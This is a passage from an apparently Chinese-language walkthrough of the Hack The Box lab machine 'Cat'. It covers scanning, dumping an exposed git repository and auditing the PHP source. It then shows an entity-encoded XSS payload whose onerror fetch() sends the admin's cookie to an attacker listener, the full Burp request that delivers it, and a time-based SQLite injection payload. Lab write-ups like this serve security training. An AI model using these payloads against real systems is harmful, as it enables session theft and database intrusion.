class="hljs-number">10</span>).<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-keyword">cat</span>.htb (<span class="hljs-number">10.10</span>.<span class="hljs-number">11.53</span>)<br>Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.23</span>s latency).<br>Not shown: <span class="hljs-number">62804</span> closed tcp ports (conn-refused), <span class="hljs-number">2729</span> filtered tcp ports (<span class="hljs-keyword">no</span>-response)<br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp <span class="hljs-keyword">open</span>  ssh<br><span class="hljs-number">80</span>/tcp <span class="hljs-keyword">open</span>  http<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host <span class="hljs-keyword">up</span>) scanned in <span class="hljs-number">41.18</span> seconds<br></code></pre></td></tr></table></figure><p>看到只开放了 22，80 两个端口</p><p>继续进行详细信息扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nmap -sT -A -p22,80 10.10.11.53 -o details<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719112919481.png" alt="image-20250719112919481"></p><p>看到有 redirect ，我们需要把这个域名与 ip 绑定才能保证详细信息的准确性。在 hosts 文件中绑定看一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;10.10.11.53  cat.htb&#x27;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> -a /etc/hosts<br></code></pre></td></tr></table></figure><p>配置好重新进行扫描</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">Starting</span> <span class="hljs-selector-tag">Nmap</span> <span class="hljs-number">7.95</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org ) at 2025-07-18 23:43 EDT</span><br>Nmap scan report for cat.htb (<span class="hljs-number">10.10</span>.<span class="hljs-number">11.53</span>)<br>Host is up (<span class="hljs-number">0.23s</span> latency).<br><br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8.2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">11</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-attribute">ssh-hostkey</span>: <br>|   <span class="hljs-number">3072</span> <span class="hljs-number">96</span>:<span class="hljs-number">2</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">f5</span>:<span class="hljs-attribute">c6</span>:<span class="hljs-attribute">f6</span>:<span class="hljs-number">9</span><span class="hljs-attribute">f</span>:<span class="hljs-number">59</span>:<span class="hljs-number">60</span>:<span class="hljs-attribute">e5</span>:<span class="hljs-number">65</span>:<span class="hljs-number">85</span>:<span class="hljs-attribute">ab</span>:<span class="hljs-number">49</span>:<span class="hljs-attribute">e4</span>:<span class="hljs-number">76</span>:<span class="hljs-number">14</span> (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">9</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">c4</span>:<span class="hljs-attribute">a4</span>:<span class="hljs-number">40</span>:<span class="hljs-attribute">e9</span>:<span class="hljs-attribute">da</span>:<span class="hljs-attribute">cc</span>:<span class="hljs-number">62</span>:<span class="hljs-attribute">d1</span>:<span class="hljs-attribute">d6</span>:<span class="hljs-number">5</span><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span><span class="hljs-attribute">f</span>:<span class="hljs-number">9</span><span class="hljs-attribute">e</span>:<span class="hljs-number">7</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">d4</span>:aa (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">6</span><span class="hljs-attribute">e</span>:<span class="hljs-number">22</span>:<span class="hljs-number">2</span><span class="hljs-attribute">a</span>:<span class="hljs-number">6</span><span class="hljs-attribute">a</span>:<span class="hljs-number">6</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">eb</span>:<span class="hljs-attribute">de</span>:<span class="hljs-number">19</span>:<span class="hljs-attribute">b7</span>:<span class="hljs-number">16</span>:<span class="hljs-number">97</span>:<span class="hljs-attribute">c2</span>:<span class="hljs-number">7</span><span class="hljs-attribute">e</span>:<span class="hljs-number">89</span>:<span class="hljs-number">29</span>:d5 (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> ((Ubuntu))<br>| <span class="hljs-attribute">http-git</span>: <br>|   <span class="hljs-number">10.10</span>.<span class="hljs-number">11.53</span>:<span class="hljs-number">80</span>/.git/<br>|     Git repository found!<br>|     Repository <span class="hljs-attribute">description</span>: Unnamed repository; edit this file <span class="hljs-string">&#x27;description&#x27;</span> to name the...<br>|_    Last commit <span class="hljs-attribute">message</span>: Cat v1 <br>|<span class="hljs-attribute">_http-title</span>: Best Cat Competition<br>| <span class="hljs-attribute">http-cookie-flags</span>: <br>|   /: <br>|     <span class="hljs-attribute">PHPSESSID</span>: <br>|_      httponly flag <span class="hljs-keyword">not</span> set<br>|<span class="hljs-attribute">_http-server-header</span>: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> (Ubuntu)<br><span class="hljs-attribute">Warning</span>: OSScan results may be unreliable because we could <span class="hljs-keyword">not</span> find at least <span class="hljs-number">1</span> open <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> closed port<br>Device <span class="hljs-attribute">type</span>: general purpose|router<br><span class="hljs-attribute">Running</span>: Linux <span class="hljs-number">4</span>.X|<span class="hljs-number">5</span>.X, MikroTik RouterOS <span class="hljs-number">7</span>.X<br>OS <span class="hljs-attribute">CPE</span>: <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">linux</span>:<span class="hljs-attribute">linux_kernel</span>:<span class="hljs-number">4</span> <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">linux</span>:<span class="hljs-attribute">linux_kernel</span>:<span class="hljs-number">5</span> <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">mikrotik</span>:<span class="hljs-attribute">routeros</span>:<span class="hljs-number">7</span> <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">linux</span>:<span class="hljs-attribute">linux_kernel</span>:<span class="hljs-number">5.6</span>.<span class="hljs-number">3</span><br>OS <span class="hljs-attribute">details</span>: Linux <span class="hljs-number">4.15</span> - <span class="hljs-number">5.19</span>, MikroTik RouterOS <span class="hljs-number">7.2</span> - <span class="hljs-number">7.5</span> (Linux <span class="hljs-number">5.6</span>.<span class="hljs-number">3</span>)<br>Network <span class="hljs-attribute">Distance</span>: <span class="hljs-number">2</span> hops<br>Service <span class="hljs-attribute">Info</span>: <span class="hljs-attribute">OS</span>: Linux; <span class="hljs-attribute">CPE</span>: <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">linux</span>:linux_kernel<br><br>TRACEROUTE (using proto <span class="hljs-number">1</span>/icmp)<br>HOP RTT       ADDRESS<br><span class="hljs-number">1</span>   <span class="hljs-number">235.06</span> ms <span class="hljs-number">10.10</span>.<span class="hljs-number">14.1</span><br><span class="hljs-number">2</span>   <span class="hljs-number">239.15</span> ms cat.htb (<span class="hljs-number">10.10</span>.<span class="hljs-number">11.53</span>)<br><br>OS <span class="hljs-keyword">and</span> Service detection performed. Please report any incorrect results at <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">23.33</span> seconds<br></code></pre></td></tr></table></figure><p>我们通过这次看到了关键信息 <code>10.10.11.53:80/.git/</code> 与 <code>httponly flag not set</code> </p><p>我们可以利用 <code>git-dumper</code> 工具把目标的源码给拉下来。同时 httponly 没有设置，这就让我们利用 xss 偷到目标 cookie 会比较简单</p><h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><p>先拉源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git-dumper http://cat.htb/.git/ dump<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719121133539.png" alt="image-20250719121133539"></p><p>我们打开 80 端口，熟悉一下网站的功能</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719123323436.png" alt="image-20250719123323436" style="zoom:67%;" /><p>看到 home vote contest winners join 页面</p><p>我们都点一下，发现 join 页面可以注册</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719123437967.png" alt="image-20250719123437967" style="zoom: 50%;" /><p>注册一个账户，登录。我们发现 contest 可以访问了，功能是添加一个猫咪去竞赛</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719123715495.png" alt="image-20250719123715495" style="zoom:50%;" /><p>我们正常添加一个，成功添加，提示信息表示：<code>这个小猫会被发送去检测</code> 那应该就是管理员要检测我们上传的猫咪</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719123911915.png" alt="image-20250719123911915" style="zoom:50%;" /><p>看一下源码，用 vscode 打开，看到给参数屏蔽了一些特殊字符</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719125340109.png" alt="image-20250719125340109"></p><p>顺便看一下管理员查看审核猫咪的页面 <code>view_cat.php</code></p><p>在 title 处使用了 <code>htmlspecialchars()</code> 函数，就不存在 xss，我们继续往下看</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719125940430.png" alt="image-20250719125940430"></p><p>来到猫咪显示的 <code>container</code> , 看到 <code>&lt;img&gt;</code> 标签的 src 属性直接就接上了 php 的 echo 函数，没做任何的过滤</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719132110494.png" alt="image-20250719132110494"></p><p>这里就可以利用 onerror 函数来进行 xss</p><blockquote><p>为什么不是任何的 echo 都可以 xss ？</p><p>因为前面 content.php 中，在上传是对参数做了 <code>forbidden_patterns</code> ，过滤了特殊字符 <code>/[+*&#123;&#125;&#39;,;&lt;&gt;()\\[\\]\\/\\:]/</code> </p><p>也就是这些字符</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">+  *  &#123;  &#125;  &#x27;  ,  ;  <span class="hljs-attribute">&lt;  &gt;</span>  (  )  [  ]  \  /  :<br></code></pre></td></tr></table></figure><p>所以我们要通过 html 实体编码来进行绕过，而实体编码在浏览器是原因输出 <strong>(包括 <code>&quot;&quot;</code> 实体编码后也就相当于加了注释符，会被当作普通字符串处理)</strong> 不会被浏览器解析为标签，这就是我们我们只能利用 <code>&lt;img src=.....&gt;</code> 这样标签的原因</p></blockquote><p>嵌入的字符串为 <code>$cat[&#39;photo_path&#39;]</code> 我们来跟一下 <code>$cat[&#39;photo_path&#39;]</code> 是怎么生成的，因为在 POST 传参时，并没有这个变量</p><p>在 <code>view_cat.php</code> 中 <code>$cat</code> 是通过数据库查到的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719134032229.png" alt="image-20250719134032229"></p><p>来到 <code>contest.php</code> 看到数据库插入中的 <code>photo_path</code> 参数的生成</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719134247568.png" alt="image-20250719134247568" style="zoom: 50%;" /><p>绑定的是 <code>$rget_file</code> 变量，继续跟</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719134441117.png" alt="image-20250719134441117"></p><blockquote><p><code>basename</code> 就是安全提取文件明的，是为了防止目录穿越的攻击</p></blockquote><p>由此我们可以推测 <code>$cat[&#39;photo_path&#39;]</code> 实行如 <code>uploads/随机值_ + name参数</code> </p><p>举个例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">uploads/dsagdfsng4wegf_小猫.jpg<br></code></pre></td></tr></table></figure><p>xss 注入的结果，把 name 换为 <code>x &quot; onerror=&quot;fetch(&#39;http://10.10.14.25:8000?cookie=&#39;+document.cookie); </code></p><p>这样 <code>$cat[&#39;photo_path&#39;]</code> 就是</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">uploads/dsagdfsng4wegf_x <span class="hljs-string">&quot; onerror=&quot;</span>fetch(&#x27;http<span class="hljs-symbol">://10</span>.<span class="hljs-number">10.14</span>.<span class="hljs-number">25</span>:<span class="hljs-number">8000</span>?cookie=&#x27;+document.cookie)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>拼接到管理员查看猫咪的 <code>view_cat.php</code> 就是</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;uploads/dsagdfsng4wegf_x &quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;fetch(&#x27;http://10.10.14.25:8000?cookie=&#x27;+document.cookie);&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;x &quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;fetch(&#x27;http://10.10.14.25:8000?cookie=&#x27;+document.cookie);&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cat-photo&quot;</span> &gt;</span><br></code></pre></td></tr></table></figure><p>在 <a href="https://gchq.github.io/CyberChef/">cyberchef</a> 中 进行 html 实体编码，把 <code>;</code> 要置换为空，因为 <code>;</code> 也在 forbidden 中</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719145621732.png" alt="image-20250719145621732"></p><p>拿到 payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;x onerror=&quot;&amp;#x66&amp;#x65&amp;#x74&amp;#x63&amp;#x68&amp;#x28&amp;#x27&amp;#x68&amp;#x74&amp;#x74&amp;#x70&amp;#x3a&amp;#x2f&amp;#x2f&amp;#x31&amp;#x30&amp;#x2e&amp;#x31&amp;#x30&amp;#x2e&amp;#x31&amp;#x34&amp;#x2e&amp;#x32&amp;#x35&amp;#x3a&amp;#x38&amp;#x30&amp;#x30&amp;#x30&amp;#x3f&amp;#x63&amp;#x6f&amp;#x6f&amp;#x6b&amp;#x69&amp;#x65&amp;#x3d&amp;#x27&amp;#x2b&amp;#x64&amp;#x6f&amp;#x63&amp;#x75&amp;#x6d&amp;#x65&amp;#x6e&amp;#x74&amp;#x2e&amp;#x63&amp;#x6f&amp;#x6f&amp;#x6b&amp;#x69&amp;#x65&amp;#x29&amp;#x3b<br></code></pre></td></tr></table></figure><p>上传，用 burp 抓包, 构造 payload，并开启监听</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/contest.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>cat.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------277959241037631938451543716937<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>23170<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://cat.htb<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://cat.htb/contest.php<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=dme3vsvslluef4d28sgsevpgdh<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br><br><span class="language-step21">----------------------------<span class="hljs-number">-277959241037631938451543716937</span></span><br><span class="language-step21">Content-Disposition: form-<span class="hljs-keyword">data</span>; name=<span class="hljs-string">&quot;cat_name&quot;</span></span><br><span class="language-step21"></span><br><span class="language-step21"><span class="hljs-string">&quot;x onerror=&quot;</span>&amp;<span class="hljs-symbol">#x66</span>&amp;<span class="hljs-symbol">#x65</span>&amp;<span class="hljs-symbol">#x74</span>&amp;<span class="hljs-symbol">#x63</span>&amp;<span class="hljs-symbol">#x68</span>&amp;<span class="hljs-symbol">#x28</span>&amp;<span class="hljs-symbol">#x27</span>&amp;<span class="hljs-symbol">#x68</span>&amp;<span class="hljs-symbol">#x74</span>&amp;<span class="hljs-symbol">#x74</span>&amp;<span class="hljs-symbol">#x70</span>&amp;<span class="hljs-symbol">#x3</span>a&amp;<span class="hljs-symbol">#x2</span>f&amp;<span class="hljs-symbol">#x2</span>f&amp;<span class="hljs-symbol">#x31</span>&amp;<span class="hljs-symbol">#x30</span>&amp;<span class="hljs-symbol">#x2</span>e&amp;<span class="hljs-symbol">#x31</span>&amp;<span class="hljs-symbol">#x30</span>&amp;<span class="hljs-symbol">#x2</span>e&amp;<span class="hljs-symbol">#x31</span>&amp;<span class="hljs-symbol">#x34</span>&amp;<span class="hljs-symbol">#x2</span>e&amp;<span class="hljs-symbol">#x32</span>&amp;<span class="hljs-symbol">#x35</span>&amp;<span class="hljs-symbol">#x3</span>a&amp;<span class="hljs-symbol">#x38</span>&amp;<span class="hljs-symbol">#x30</span>&amp;<span class="hljs-symbol">#x30</span>&amp;<span class="hljs-symbol">#x30</span>&amp;<span class="hljs-symbol">#x3</span>f&amp;<span class="hljs-symbol">#x63</span>&amp;<span class="hljs-symbol">#x6</span>f&amp;<span class="hljs-symbol">#x6</span>f&amp;<span class="hljs-symbol">#x6</span>b&amp;<span class="hljs-symbol">#x69</span>&amp;<span class="hljs-symbol">#x65</span>&amp;<span class="hljs-symbol">#x3</span>d&amp;<span class="hljs-symbol">#x27</span>&amp;<span class="hljs-symbol">#x2</span>b&amp;<span class="hljs-symbol">#x64</span>&amp;<span class="hljs-symbol">#x6</span>f&amp;<span class="hljs-symbol">#x63</span>&amp;<span class="hljs-symbol">#x75</span>&amp;<span class="hljs-symbol">#x6</span>d&amp;<span class="hljs-symbol">#x65</span>&amp;<span class="hljs-symbol">#x6</span>e&amp;<span class="hljs-symbol">#x74</span>&amp;<span class="hljs-symbol">#x2</span>e&amp;<span class="hljs-symbol">#x63</span>&amp;<span class="hljs-symbol">#x6</span>f&amp;<span class="hljs-symbol">#x6</span>f&amp;<span class="hljs-symbol">#x6</span>b&amp;<span class="hljs-symbol">#x69</span>&amp;<span class="hljs-symbol">#x65</span>&amp;<span class="hljs-symbol">#x29</span>&amp;<span class="hljs-symbol">#x3</span>b</span><br><span class="language-step21">----------------------------<span class="hljs-number">-277959241037631938451543716937</span></span><br><span class="language-step21">Content-Disposition: form-<span class="hljs-keyword">data</span>; name=<span class="hljs-string">&quot;age&quot;</span></span><br><span class="language-step21"></span><br><span class="language-step21"><span class="hljs-number">11</span></span><br><span class="language-step21">----------------------------<span class="hljs-number">-277959241037631938451543716937</span></span><br><span class="language-step21">Content-Disposition: form-<span class="hljs-keyword">data</span>; name=<span class="hljs-string">&quot;birthdate&quot;</span></span><br><span class="language-step21"></span><br><span class="language-step21"><span class="hljs-number">0011</span><span class="hljs-number">-01</span><span class="hljs-number">-01</span></span><br><span class="language-step21">----------------------------<span class="hljs-number">-277959241037631938451543716937</span></span><br><span class="language-step21">Content-Disposition: form-<span class="hljs-keyword">data</span>; name=<span class="hljs-string">&quot;weight&quot;</span></span><br><span class="language-step21"></span><br><span class="language-step21"><span class="hljs-number">11</span></span><br><span class="language-step21">----------------------------<span class="hljs-number">-277959241037631938451543716937</span></span><br><span class="language-step21">Content-Disposition: form-<span class="hljs-keyword">data</span>; name=<span class="hljs-string">&quot;cat_photo&quot;</span>; filename=<span class="hljs-string">&quot;cat.jpeg&quot;</span></span><br><span class="language-step21">Content-Type: image/jpeg</span><br><span class="language-step21"></span><br><span class="language-step21">GIF89a;</span><br><span class="language-step21">aaaaaaa</span><br><span class="language-step21">----------------------------<span class="hljs-number">-277959241037631938451543716937</span>--</span><br></code></pre></td></tr></table></figure><p>发包, 成功拿到管理员的 cookie</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719145824393.png" alt="image-20250719145824393"></p><h2 id="立足点"><a href="#立足点" class="headerlink" title="立足点"></a>立足点</h2><p>把拿到的 cookie 替换到浏览器中</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.10.11.53</span> - - <span class="hljs-string">[19/Jul/2025 02:57:58]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /?cookie=PHPSESSID=dg66mtcr1r8vbnb5t3c8n0o218 HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br></code></pre></td></tr></table></figure><p>刷新，看到多了一个 Admin 的菜单，我们现在已经是管理员权限了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719153748349.png" alt="image-20250719153748349"></p><p>我们回到源码，这里 snyk 审计插件也告诉了我们一处 sql 注入</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719154238622.png" alt="image-20250719154238622"></p><p>可以看到也很明显，试一次 insert 注入</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719154422649.png" alt="image-20250719154422649"></p><p>从 config 连接信息中，我们可以知道这是一个 sqlite 数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// Database configuration</span><br><span class="hljs-variable">$db_file</span> = <span class="hljs-string">&#x27;/databases/cat.db&#x27;</span>;<br><br><span class="hljs-comment">// Connect to the database</span><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;sqlite:<span class="hljs-subst">$db_file</span>&quot;</span>);<br>    <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>, PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>);<br>&#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Error: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们可以利用 [SQLite Injection - Payloads All The Things](<a href="https://swisskyrepo.github.io/PayloadsAllTheThings/SQL">https://swisskyrepo.github.io/PayloadsAllTheThings/SQL</a> Injection&#x2F;SQLite Injection&#x2F;#sqlite-remote-code-execution) 这里的 payload 执行命令</p><p>先在 admin 添加一个小猫</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719161243864.png" alt="image-20250719161243864" style="zoom: 50%;" /><p>在 admin 页面就可以看到 accept 请求的位置</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719161420168.png" alt="image-20250719161420168"></p><p>发包 burp 拦截</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/accept_cat.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>cat.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>19<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://cat.htb<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://cat.htb/admin.php<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=jno38dja2j93e6ode9sme2a8ap<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-apache"><span class="hljs-attribute">catName</span>=<span class="hljs-number">111</span>&amp;catId=<span class="hljs-number">1</span></span><br></code></pre></td></tr></table></figure><p>在 catName 处存在注入点</p><p>发送 payload</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">catName=111111&#x27;), ((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> (<span class="hljs-number">1</span>=<span class="hljs-number">1</span>) <span class="hljs-keyword">THEN</span> <span class="hljs-keyword">LIKE</span>(<span class="hljs-string">&#x27;ABC&#x27;</span>,<span class="hljs-built_in">UPPER</span>(HEX(RANDOMBLOB(<span class="hljs-number">30000000</span>)))) <span class="hljs-keyword">ELSE</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">END</span>)) --&amp;catId=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>url 编码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">catName<span class="hljs-operator">=</span><span class="hljs-number">111111</span><span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%28</span><span class="hljs-variable">%53</span><span class="hljs-variable">%45</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%45</span><span class="hljs-variable">%43</span><span class="hljs-variable">%54</span><span class="hljs-variable">%20</span><span class="hljs-variable">%43</span><span class="hljs-variable">%41</span><span class="hljs-variable">%53</span><span class="hljs-variable">%45</span><span class="hljs-variable">%20</span><span class="hljs-variable">%57</span><span class="hljs-variable">%48</span><span 